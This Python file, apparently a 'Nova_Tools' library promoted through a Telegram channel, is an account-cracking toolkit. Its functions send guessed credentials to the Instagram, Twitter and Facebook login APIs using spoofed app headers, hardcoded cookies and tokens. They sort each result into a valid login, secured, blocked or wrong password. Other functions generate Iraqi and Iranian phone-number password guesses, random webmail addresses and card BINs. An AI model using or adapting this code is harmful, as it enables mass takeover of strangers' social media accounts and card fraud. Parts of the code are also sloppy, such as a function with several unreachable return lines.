import requests
from uuid import uuid4
from user_agent import generate_user_agent
import random
import names
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;39m' 
C = '\033[2;35m' 
B = '\033[2;36m'
Y = '\033[1;34m' 
Nova = 'My Channel @ArabShadows'
uid = str(uuid4)
class Nova_Tools:
    def login_instagram(username,password):
        URL_INSTA = 'https://i.instagram.com/api/v1/accounts/login/'
        HEADERS_INSTA = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        DATA_INSTA = {'uuid': uid,'password': password,'username': username,'device_id': uid,'from_reg': 'false','_csrftoken': 'missing','login_attempt_countn': '0'}
        RESPON = requests.post(URL_INSTA,headers=HEADERS_INSTA,data=DATA_INSTA).text
        if ('logged_in_user') in RESPON:
            data = {
            'username':username,
            'password':password,
            'The resulting':'True',
            }
            return data
        elif ('check your username') in RESPON:
            data = {
            'username':username,
            'password':password,
            'The resulting':'Band username',
            }
            return data
        elif ('challenge_required') in RESPON:
            data = {
            'username':username,
            'password':password,
            'The resulting':'Secure',
            }
            return data
        elif ('Please wait a few minutes') in RESPON:
            data = {
            'username':username,
            'password':password,
            'The resulting':'block ip',
            }
            return "block ip"
        else:
            data = {
            'username':username,
            'password':password,
            'The resulting':'False password',
            }
            return data
    def login_twitter(username,password):
        URL_TWITTER = 'https://twitter.com/sessions'
        HEADERS_TWITTER={
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     
		'Accept-Encoding': 'gzip, deflate, br',
		
        'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
		
        'Content-Length': '901',
		
        'Content-Type': 'application/x-www-form-urlencoded',
		
        'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
		
        'Host': 'twitter.com',
		
        'Origin': 'https://twitter.com',
		
        'Referer': 'https://twitter.com/login?lang=ar',
		
        'TE': 'Trailers',
		
        'Upgrade-Insecure-Requests': '1',
		
        'User-Agent': generate_user_agent()}
        DATA_TWITTER={
        'redirect_after_login': '/',
		
        'remember_me': '1',
		
        'authenticity_token': '10908ac0975311eb868c135992f7d397',
		
        'wfa': '1',
		
        'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		
        'session[username_or_email]': username,
		
        'session[password]': password}
        RESPON = requests.post(URL_TWITTER,headers=HEADERS_TWITTER,data=DATA_TWITTER)
        if ("ct0") in RESPON.cookies:
            data =  {'username':username,'password':password,'The resulting':'True'}
            return data
        else:
            data =  {'username':username,'password':password,'The resulting':'False password'}
            return data
            
    def login_facebook(username,password):
        GET = random.randint(20000.0, 40000.0)
        URL_FACEBOOK = 'https://b-api.facebook.com/method/auth.login'
        HEADERS_FACEBOOK = {
                    'x-fb-connection-bandwidth': repr(GET), 
                    'x-fb-sim-hni': repr(GET), 
                    'x-fb-net-hni': repr(GET), 
                    'x-fb-connection-quality': 'EXCELLENT', 
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                    'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'x-fb-http-engine': 'Liger'}
        PARAMS_FACEBOOK = {
                   'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                   'format': 'JSON',
                   'sdk_version': '2',
                   'email': username,
                   'locale': 'en_US',
                   'password': password,
                   'sdk': 'ios',
                   'generate_session_cookies': '1',
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',}
        RESPON =requests.get(URL_FACEBOOK, params=PARAMS_FACEBOOK, headers=HEADERS_FACEBOOK).text
        if str("EAA") in str(RESPON):
            data =  {'username':username,'password':password,'The resulting':'True'}
            return data
        elif str("www.facebook.com") in RESPON:
            data =  {'username':username,'password':password,'The resulting':'Secure'}
            return data
        else:
            data =  {'username':username,'password':password,'The resulting':'False password'}
            return data    
    def get_user_pass_iraq():
        NAM = "12345678900"
        GET = str(''.join((random.choice(NAM) for i in range(8))))
        ACOONT = ("+96477"+GET+':'+"077"+GET)
        return ACOONT
        
    def get_user_pass_iran():
        NAM = "1234567890"
        GET = str(''.join((random.choice(NAM) for i in range(7))))
        ACOONT = ("+98919"+GET+':'+"0919"+GET)
        return ACOONT
    def get_email_gmail():
        NAM = "1234567890"
        GET = str(''.join((random.choice(NAM) for i in range(4))))
        NAME = names.get_first_name()
        email = (NAME+GET+"@gmail.com")
        return email
            
    def get_email_yahoo():
        NAM = "1234567890"
        GET = str(''.join((random.choice(NAM) for i in range(4))))
        NAME = names.get_first_name()
        email = (NAME+GET+"@yahoo.com")
        return email
        
    def user_agent(text,number):
        us = str(''.join((random.choice(text) for i in range(number))))
        return us  
        
    def By():
        
        return Nova    
        
    def get_email_hotmail():
        NAM = "1234567890"
        GET = str(''.join((random.choice(NAM) for i in range(4))))
        NAME = names.get_first_name()
        email = (NAME+GET+"@hotmail.com")
        return email 
    def get_email_outlook():
        NAM = "1234567890"
        GET = str(''.join((random.choice(NAM) for i in range(4))))
        NAME = names.get_first_name()
        email = (NAME+GET+"@outlook.com")
        return email
    def make_bin():  	
	    d = ('1234567890')
	    f = random.choice(d)
	    g = random.choice(d)
	    haa = random.choice(d)
	    has = random.choice(d)
	    star = (f'48{f}{g}{haa}{has}')
	    return star
    def check_bin(bin):
	    url = f'https://bin-checker.net/api/{bin}'
	    resp = requests.get(url).json()
	    hs = resp['scheme']
	    hf = resp['country']['code']
	    hr = resp['country']['name']
	    rir = resp['bank']['name']
	    jjj = resp['level']
	    sdw = resp['type']
	    free = resp['bank']['phone']
	    return hs
	    return hf
	    return hr
	    return rir
	    return jjj
	    return sdw
	    return free
    def Check_users_Telegram(user):
        ree = requests.get(f"https://t.me/{user}").text
        jd = f'\x1b[1;32m Available:{user}'
        jk = f'\x1b[1;31mNOT Available:{user}'
        if 'tgme_username_link' in ree:
        	return jd
        else:
        	return jk
    def make_users():
       oip = 'qwertyuioplkjhgfdsazxcvbnm'
       upper = 'ABCDEFGHIKLMNOPQSTVWSYZ'
       number = '0987654321'
       uu7 = '_'
       all = number + upper + oip
       length = 1
       u = ''.join(random.sample(all, length))
       s = ''.join(random.sample(all, length))
       r = ''.join(random.sample(all, length))
       kk = u + '_' + s + '_' + r
       return kk